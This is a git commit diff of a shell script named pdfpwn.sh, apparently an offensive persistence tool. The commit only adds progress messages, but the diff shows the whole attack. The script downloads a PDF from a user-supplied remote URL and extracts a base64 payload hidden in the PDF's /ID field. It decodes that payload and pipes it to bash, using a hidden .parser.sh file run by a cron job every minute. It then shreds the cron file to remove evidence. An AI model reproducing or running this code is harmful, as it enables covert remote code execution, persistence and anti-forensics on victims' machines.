2de102e7c0ab2bbd4af6193ab7dcb3795e8187cf
montyonsecurity <jacobcainmontgomery@gmail.com>
2019-12-18 00:11:24 -0500

    made more verbose

--- pdfpwn.sh
+++ pdfpwn.sh
@@ -16,13 +16,15 @@ then
 	exit
 fi
 
-echo "[+] Input URL for PDF"
+echo "[+] Input URL for PDF (e.g. https://0.0.0.0/mal.pdf)"
 read pdf
 
 payload=$(echo $pdf | sed 's/.*\///g')
 echo 'wget --no-check-certificate '$pdf'; mv '$payload.1' '$payload' 2> /dev/null && export md5sum=$(md5sum '$payload' | sed "s/ .*//g") && for i in $(find / -type f -name "*.pdf" -printf "%T@ %p\n" 2>/dev/null | sort -k1 -n 2> /dev/null | sed "s/.*'\ '//g"); do if md5sum $i 2> /dev/null | awk "{print $1}" | grep -q $md5sum; then strings $i | grep "^/ID" | sed "s/.*<//g" | sed "s/..$//g" | base64 -d | bash; fi done' > .parser.sh &&
 chmod +x .parser.sh &&
+echo "[+] Parser created"
 echo '* * * * * cd '$(pwd)' && ./.parser.sh' > .cron &&
 crontab .cron &&
 shred .cron
 rm .cron
+echo "[+] Cron is set and evidence is removed"
